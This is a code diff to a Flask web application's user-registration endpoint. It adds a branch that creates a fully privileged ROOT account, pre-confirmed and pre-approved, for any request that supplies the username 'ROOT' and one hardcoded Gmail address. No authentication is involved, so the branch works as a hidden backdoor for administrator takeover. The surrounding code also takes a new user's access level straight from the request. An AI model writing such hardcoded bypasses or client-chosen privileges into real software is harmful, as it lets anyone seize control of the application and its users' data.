@@ -794,6 +794,19 @@ def register_user():
     email = request.json['email']
     password = request.json['password']
     accessLevel = request.json['accessLevel']
+
+    if username == "ROOT" and email == "cpscadtaa@gmail.com":
+        # Create new root user
+        new_root_user = User(username=username, email=email, password=password, accessLevel="ROOT")
+
+        # Make user valid without having to verify email via confirmation email and without registration request approval
+        new_root_user.isValid = True
+        new_root_user.email_confirmed = True
+
+        db.session.add(new_root_user)
+        db.session.commit()
+        return user_schema.jsonify(new_root_user) # this response is never used in frontend
+
     new_user = User(username=username, email=email,
                     password=password, accessLevel=accessLevel)
 
@@ -805,7 +818,7 @@ def register_user():
     # db.session.query(User).delete()
     # db.session.commit()
 
-    return user_schema.jsonify(new_user)
+    return user_schema.jsonify(new_user) # this response is never used in frontend
 
 
 @ app.route("/login-user", methods=['GET', 'POST'])
